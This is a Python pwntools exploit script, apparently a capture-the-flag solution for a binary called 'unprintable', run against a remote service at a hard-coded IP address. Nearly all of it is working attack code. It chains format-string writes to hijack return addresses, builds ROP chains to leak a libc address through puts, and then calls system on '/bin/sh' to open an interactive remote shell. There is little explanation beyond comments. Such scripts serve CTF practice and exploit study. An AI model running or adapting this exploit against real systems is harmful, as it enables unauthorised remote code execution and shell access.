#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g  -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so '.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './unprintable'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('45.32.120.212', 9999)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/glibc/glibc-2.23/debug_x64/lib/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    # b *0x4007C1
    # b *0x000000000040082d
    # b *0x4005F0
    # c
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

sh.recvuntil('gift: ')
stack_addr = int(sh.recvline(), 16)
log.info('stack_addr: ' + hex(stack_addr))

printf_ret = stack_addr - 0x138
log.info('printf_ret: ' + hex(printf_ret))

payload_addr = printf_ret + 8
log.info('payload_addr: ' + hex(payload_addr))

stdout_addr = stack_addr - 0x1c0
log.info('stdout_addr: ' + hex(stdout_addr))

interval = 0.5

if((printf_ret & 0xffff) > 0x2000):
    raise Exception()


last = (printf_ret - 904 + 0x10000) & 0xffff
payload ='%904c%26$ln'  + '%'  + str(last) + 'c%11$hn'
sh.sendline(payload.ljust(0x100, '\0') + p64(elf.symbols['main']) + '\0')

def load(position, ch):
    time.sleep(interval)
    last = (payload_addr+position - 163 + 0x10000) & 0xffff
    temp = '%163c%75$hhn' + '%' + str(last) + 'c%21$hn\0'
    sh.sendline(temp)

    # pause()
    time.sleep(interval)
    last = (ord(ch) - 163 + 0x100) & 0xff
    temp = '%163c%75$hhn' + '%' + str(last) + 'c%16$hhn\0'
    sh.sendline(temp)

# pause()

stack_addr = 0x601060 + 0x80
buf_addr = 0x601060

layout1 = [
    0x000000000040082d, # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    stack_addr,
]

payload = flat(layout1)
for i in range(len(payload)):
    load(i, payload[i])

# 0x0000000000400833 : pop rdi ; ret
pop_rdi_ret = 0x0000000000400833
# 0x0000000000400831 : pop rsi ; pop r15 ; ret
pop_rsi_r15_ret = 0x0000000000400831
ret_addr = 0x00000000004005d1

# 0x00000000004005d1 : ret 
sh.send('%1489c%75$hn\0'.ljust(0x80+0x18, 'f') + p64(0x0000000004007A3))
time.sleep(interval)

# stack_addr
layout2 = [
    pop_rdi_ret, 
    0,
    pop_rsi_r15_ret,
    stdout_addr - 8 * 4,
    0,
    elf.plt['read'],

    pop_rdi_ret,
    0,
    pop_rsi_r15_ret,
    stdout_addr + 8,
    0,
    elf.plt['read'],

    pop_rdi_ret,
    0,

    0x000000000040082d, # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret   
    stdout_addr - 8 * 4,
]

# stack_addr + 0x200
layout3 = [
    0,0,0,
    ret_addr,

    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],

    pop_rdi_ret,
    0,
    pop_rsi_r15_ret,
    stack_addr + 0x400,
    0,
    elf.plt['read'],

    0x000000000040082d, # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret   
    stack_addr + 0x400,
]

# pause()
payload = '/bin/sh 1>&0\0'.ljust(0x80 + 0x18, 'h') + flat(layout2).ljust(0x120 - 0x98, 'g') + flat(layout3)

time.sleep(interval)
sh.send(payload)

# pause()
time.sleep(interval)
# layout 5
sh.send(p64(0) * 3 + p64(pop_rsi_r15_ret) + p8(0x90))
time.sleep(interval)
sh.send(p64(0) + p64(elf.plt['read']) + p64(0x000000000040082d) + p64(buf_addr + 0x120))

# pause()
time.sleep(interval)

# pause()
# modify stdout->_fileno
sh.send(p8(0))

time.sleep(interval)

result = sh.recvline()[:-1]
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['puts']
log.success('libc_addr: ' + hex(libc_addr))

layout6 = [
    0,0,0,
    pop_rdi_ret,
    buf_addr,
    libc_addr +libc.symbols['system'],

    pop_rdi_ret,
    0,
    libc_addr + libc.symbols['exit'],
]
sh.send(flat(layout6))

sh.interactive()
clear()
